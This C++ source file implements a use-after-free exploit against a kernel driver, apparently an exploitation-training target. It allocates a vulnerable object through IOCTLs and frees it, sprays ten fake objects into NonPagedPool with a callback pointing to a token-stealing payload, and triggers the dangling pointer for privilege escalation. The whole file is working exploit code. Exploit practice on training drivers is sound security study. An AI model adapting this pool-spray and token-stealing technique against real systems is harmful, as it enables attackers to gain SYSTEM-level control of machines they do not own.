#include "UseAfterFree.h"

bool 
ExploitUseAfterFree::exploit() {
	
	DWORD dummy = 0;
	
	struct FakeObject {
		void *callback;
		unsigned char buffer[0x54];
	};

	wcout << L"[+] Step 1: Allocate Use-After-Free vulnerable object..." << endl;
	bool ret = driver.SendIOCTL (
		ExploitUseAfterFree::Ioctl_Code_Allocate,
		&dummy,
		sizeof(dummy)
	);

	wcout << L"[+] Step 2: Free that just allocated object to introduce dangling-pointer" << endl;
	ret = driver.SendIOCTL (
		ExploitUseAfterFree::Ioctl_Code_Free,
		&dummy,
		sizeof(dummy)
	);
	
	FakeObject obj;
	memset(&obj, 0x43, sizeof(obj));
	obj.callback = tokenStealingPayloadRealPointer;
	
	wcout << L"[+] Step 3: Spraying 10 fake objects in NonPagedPool..." << endl;
	for(size_t i = 0; i < 10; i++ ) {
		driver.SendIOCTLQuiet (
			ExploitUseAfterFree::Ioctl_Code_Alloc_Fake_Object,
			&obj,
			sizeof(obj)
		);
	}
		
	wcout << L"[+] Step 4: Triggering Use-After-Free..." << endl;
	ret = driver.SendIOCTL (
		ExploitUseAfterFree::Ioctl_Code_Use,
		&dummy,
		sizeof(dummy)
	);
	
	return ret;
}

